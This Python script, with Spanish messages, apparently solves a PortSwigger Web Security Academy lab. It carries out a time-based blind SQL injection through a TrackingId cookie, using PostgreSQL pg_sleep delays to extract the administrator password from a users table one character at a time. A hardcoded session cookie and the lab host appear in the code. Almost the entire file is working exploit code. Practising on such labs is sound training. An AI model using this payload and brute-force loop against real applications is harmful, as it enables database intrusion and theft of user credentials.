from pwn import *
from termcolor import colored
import requests
import sys
import signal
import string
import time

def def_handler(sig, frame):
    print(colored(f"\n[!] Saliendo... \n",'red'))
    p1.failure("Ataque de fuerza fruta detenido")
    sys.exit(1)

# CTRL+C
signal.signal(signal.SIGINT, def_handler)

characters = string.ascii_lowercase + string.digits

p1 = log.progress("SQLI")

def makeSQLI():
    
    p1.status("Iniciando ataque de fuerza bruta")

    time.sleep(2)

    password = ""

    p2 = log.progress("Password")

    for position in range(1,21):
        for character in characters:
            cookies = {
                'TrackingId': f"'%3b select case when(username='administrator' and substring(password,{position},1)='{character}') then pg_sleep(5) else pg_sleep(0) end from users-- -",
                'session': "UpvC6UKq4oi5HgMAkUwYDQWI5gjdow7p"
            }

            p1.status(cookies["TrackingId"])
            
            time_start = time.time()

            r = requests.get("https://0aa500e903fe3b288052ad56002b001f.web-security-academy.net", cookies=cookies)

            time_end = time.time()

            if time_end - time_start > 3:
                password += character
                p2.status(password)
                break


if __name__ == '__main__':
    makeSQLI()
